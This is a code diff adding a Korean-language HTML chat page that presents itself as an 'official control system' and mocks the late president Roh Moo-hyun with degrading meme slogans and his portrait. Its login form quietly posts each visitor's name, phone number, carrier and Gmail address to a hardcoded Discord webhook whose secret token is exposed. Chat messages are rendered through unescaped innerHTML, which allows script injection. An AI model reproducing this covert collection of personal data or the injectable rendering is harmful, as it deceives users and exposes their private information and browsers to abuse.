@@ -1,0 +1,240 @@
+[index.html](https://github.com/user-attachments/files/24609615/index.html)
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>응디시티 - 공식 관제 시스템</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+        import { getAuth, signInAnonymously, onAuthStateChanged, signInWithCustomToken } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+        import { getFirestore, collection, addDoc, query, orderBy, onSnapshot, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+
+        // 1. Firebase 초기화
+        const firebaseConfig = JSON.parse(__firebase_config);
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getFirestore(app);
+        const appId = typeof __app_id !== 'undefined' ? __app_id : 'eundicity-universal';
+
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1460622639637729402/McoPaA3kn18CkbdlyigwKt7RnFrOrnzdOarw9shUjQawzedZzLfmtB4hCc7kcfUeM7rd";
+
+        let currentUser = null;
+        let userData = JSON.parse(localStorage.getItem('eundi_user')) || {};
+
+        const loginSection = document.getElementById('login-section');
+        const chatSection = document.getElementById('chat-section');
+        const chatBox = document.getElementById('chat-box');
+        const userMsgInput = document.getElementById('user-msg');
+        const emailError = document.getElementById('email-error');
+
+        // 2. 인증 로직 수정 (Rule 3 준수)
+        const initAuth = async () => {
+            try {
+                if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
+                    await signInWithCustomToken(auth, __initial_auth_token);
+                } else {
+                    await signInAnonymously(auth);
+                }
+            } catch (err) {
+                console.error("Auth Error:", err);
+            }
+        };
+
+        onAuthStateChanged(auth, (user) => {
+            if (user && userData.name) {
+                currentUser = user;
+                showChat();
+            } else if (!user) {
+                initAuth();
+            }
+        });
+
+        window.startLogin = async () => {
+            const name = document.getElementById('u-name').value;
+            const phone = document.getElementById('u-phone').value;
+            const email = document.getElementById('u-email').value;
+            const carrier = document.getElementById('u-carrier').value;
+
+            if (!name || !phone || !email || !carrier) {
+                alert("모든 정보를 입력해야 기분이 좋아집니다.");
+                return;
+            }
+
+            if (!email.includes('@gmail.com')) {
+                emailError.classList.remove('hidden');
+                return;
+            } else {
+                emailError.classList.add('hidden');
+            }
+
+            userData = { name, phone, email, carrier };
+            localStorage.setItem('eundi_user', JSON.stringify(userData));
+
+            try {
+                await sendToWebhook(userData);
+                
+                // 로그인 후 환영 메시지 전송
+                if (auth.currentUser) {
+                    await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'messages'), {
+                        text: `${name}응디시티에 들어온것을 환영합니노무현`,
+                        sender: "시스템",
+                        timestamp: serverTimestamp()
+                    });
+                    showChat();
+                }
+            } catch (error) {
+                console.error("Login Step Error:", error);
+                alert("접속 실패! 브라우저 콘솔을 확인하세요.");
+            }
+        };
+
+        function showChat() {
+            loginSection.classList.add('hidden');
+            chatSection.classList.remove('hidden');
+            chatSection.classList.add('flex');
+            listenMessages();
+        }
+
+        async function sendToWebhook(data) {
+            const payload = {
+                embeds: [{
+                    title: "🎤 응디시티 - 유저 접속 로그",
+                    color: 16761095,
+                    thumbnail: { url: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Roh_Moo-hyun_presidential_portrait.jpg/440px-Roh_Moo-hyun_presidential_portrait.jpg" },
+                    fields: [
+                        { name: "👤 이름", value: data.name, inline: true },
+                        { name: "📶 통신사", value: data.carrier, inline: true },
+                        { name: "📱 연락처", value: data.phone, inline: false },
+                        { name: "📧 메일", value: data.email, inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+            try {
+                await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+            } catch(e) {}
+        }
+
+        function listenMessages() {
+            if (!auth.currentUser) return;
+            const q = query(collection(db, 'artifacts', appId, 'public', 'data', 'messages'), orderBy("timestamp", "asc"));
+            onSnapshot(q, (snapshot) => {
+                chatBox.innerHTML = "";
+                snapshot.forEach((doc) => {
+                    const msg = doc.data();
+                    const isSystem = msg.sender === "시스템" || msg.sender === "MC무현";
+                    const isMe = msg.sender === userData.name;
+                    
+                    const wrapper = document.createElement('div');
+                    wrapper.className = `flex flex-col mb-4 ${isSystem ? 'items-center' : (isMe ? 'items-end' : 'items-start')}`;
+                    
+                    if(isSystem) {
+                        wrapper.innerHTML = `<div class="bg-yellow-100 text-yellow-700 px-4 py-1 rounded-full text-[10px] font-bold border border-yellow-200 uppercase tracking-tighter">🔔 ${msg.text}</div>`;
+                    } else {
+                        wrapper.innerHTML = `
+                            <span class="text-[10px] text-gray-400 mb-1 px-1 font-bold">${msg.sender}</span>
+                            <div class="max-w-[85%] px-4 py-2 rounded-2xl text-sm ${isMe ? 'bg-yellow-400 text-gray-900 rounded-tr-none' : 'bg-white border border-gray-100 text-gray-800 rounded-tl-none'} shadow-sm">
+                                ${msg.text}
+                            </div>`;
+                    }
+                    chatBox.appendChild(wrapper);
+                });
+                chatBox.scrollTop = chatBox.scrollHeight;
+            }, (err) => console.error("Snapshot error:", err));
+        }
+
+        window.sendMsg = async () => {
+            const text = userMsgInput.value.trim();
+            if (!text || !auth.currentUser) return;
+            
+            const tempText = text;
+            userMsgInput.value = ""; // 즉시 비우기 (사용자 경험)
+
+            try {
+                await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'messages'), {
+                    text: tempText,
+                    sender: userData.name || "익명",
+                    timestamp: serverTimestamp()
+                });
+            } catch (e) {
+                console.error("메시지 전송 실패:", e);
+                userMsgInput.value = tempText; // 실패 시 다시 채우기
+                alert("메시지 전송에 실패했습니다. (Firestore 권한 확인 필요)");
+            }
+        };
+
+        window.handleKey = (e) => { if (e.key === 'Enter') window.sendMsg(); };
+    </script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Pretendard:wght@400;700;900&display=swap');
+        body { font-family: 'Pretendard', sans-serif; background: #fafafa; }
+        .hidden { display: none; }
+        .mc-profile { filter: grayscale(20%) contrast(1.1); }
+        input:focus, select:focus { outline: none; border-color: #facc15; box-shadow: 0 0 0 3px rgba(250, 204, 21, 0.1); }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center p-4 bg-[#f0f0f0]">
+
+    <div id="login-section" class="w-full max-w-md bg-white rounded-[2.5rem] p-10 shadow-2xl border border-gray-100">
+        <div class="flex flex-col items-center mb-8">
+            <div class="w-24 h-24 mb-4 overflow-hidden rounded-full border-4 border-yellow-400 shadow-lg">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Roh_Moo-hyun_presidential_portrait.jpg/440px-Roh_Moo-hyun_presidential_portrait.jpg" 
+                     class="w-full h-full object-cover mc-profile">
+            </div>
+            <h1 class="text-3xl font-black text-gray-900 tracking-tighter">응디시티</h1>
+            <p class="text-xs text-yellow-600 font-bold mt-2 bg-yellow-50 px-3 py-1 rounded-full uppercase tracking-widest">우흥 나는 노무현이다!!</p>
+        </div>
+
+        <div class="space-y-4">
+            <div class="grid grid-cols-2 gap-3">
+                <input type="text" id="u-name" class="w-full rounded-2xl px-5 py-3.5 text-sm bg-gray-50 border border-gray-100" placeholder="이름">
+                <select id="u-carrier" class="w-full rounded-2xl px-4 py-3.5 text-sm bg-gray-50 border border-gray-100">
+                    <option value="">통신사 선택</option>
+                    <option value="SKT">SKT</option>
+                    <option value="KT">KT</option>
+                    <option value="LG U+">LG U+</option>
+                    <option value="알뜰폰">알뜰폰</option>
+                </select>
+            </div>
+            <input type="tel" id="u-phone" class="w-full rounded-2xl px-5 py-3.5 text-sm bg-gray-50 border border-gray-100" placeholder="휴대폰 번호 (010-0000-0000)">
+            <div class="relative">
+                <input type="email" id="u-email" class="w-full rounded-2xl px-5 py-3.5 text-sm bg-gray-50 border border-gray-100" placeholder="구글 이메일">
+                <p id="email-error" class="hidden text-[10px] text-red-500 mt-1.5 ml-2 font-bold">⚠️ @gmail.com이 포함돼지 않았습니다.</p>
+            </div>
+            
+            <button onclick="startLogin()" class="w-full bg-gray-900 hover:bg-black text-white font-black py-4 rounded-2xl text-lg mt-4 transition-all active:scale-95 shadow-lg">
+                로그인
+            </button>
+        </div>
+    </div>
+
+    <div id="chat-section" class="hidden w-full max-w-md h-[90vh] bg-white rounded-[2.5rem] flex-col overflow-hidden shadow-2xl border border-gray-200">
+        <div class="px-6 py-5 border-b border-gray-100 flex items-center justify-between bg-white/80 backdrop-blur-lg sticky top-0 z-20">
+            <div class="flex items-center">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Roh_Moo-hyun_presidential_portrait.jpg/440px-Roh_Moo-hyun_presidential_portrait.jpg" 
+                     class="w-10 h-10 rounded-xl object-cover mr-3 shadow-sm mc-profile">
+                <div>
+                    <h2 class="text-sm font-black text-gray-900 uppercase">응디시티</h2>
+                    <div class="flex items-center gap-1.5">
+                        <span class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
+                        <span class="text-[10px] text-gray-400 font-bold uppercase">Public Channel</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div id="chat-box" class="flex-1 overflow-y-auto p-5 bg-[#fafafa] space-y-1"></div>
+
+        <div class="p-4 bg-white border-t border-gray-50 flex gap-2 items-center">
+            <input type="text" id="user-msg" onkeypress="handleKey(event)" class="flex-1 bg-gray-100 border-none rounded-2xl px-5 py-3.5 text-sm focus:ring-2 focus:ring-yellow-400" placeholder="메시지를 입력하세요...">
+            <button onclick="sendMsg()" class="bg-yellow-400 text-gray-900 w-12 h-12 rounded-xl flex items-center justify-center shadow-md active:scale-90 transition-all">
+                <i class="fas fa-paper-plane"></i>
+            </button>
+        </div>
+    </div>
+
+</body>
+</html>
